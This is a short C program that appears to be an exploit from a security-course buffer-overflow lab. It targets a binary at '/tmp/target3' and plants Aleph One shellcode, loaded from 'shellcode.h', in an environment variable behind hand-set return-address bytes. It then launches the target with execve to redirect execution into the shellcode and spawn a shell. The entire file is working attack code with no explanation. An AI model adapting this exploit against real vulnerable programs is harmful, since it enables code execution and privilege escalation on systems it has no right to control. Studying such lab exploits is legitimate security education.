#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  
  //0xbf ff ff db
  args[1] = "\x9f\xff\xff\xbf"; 
  
  args[2] = NULL;
  int sizeOfShell =  sizeof(shellcodeAlephOne) / sizeof(shellcodeAlephOne[0]);
  char att[sizeOfShell + 8];
  
  memset(att,'\xbf', 4*sizeof(char));  
  memset(att+3,'\xbf', sizeof(char));  
  memset(att+4,'\xff', sizeof(char));  
  memset(att+5,'\xff', sizeof(char));  
  memset(att+6,'\xa7', sizeof(char));  





  //strcat(att , "\xbf\xff\xff\xe3");
  memcpy(att+7 , shellcodeAlephOne , sizeOfShell*sizeof(char));
  
  env[0] = att;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


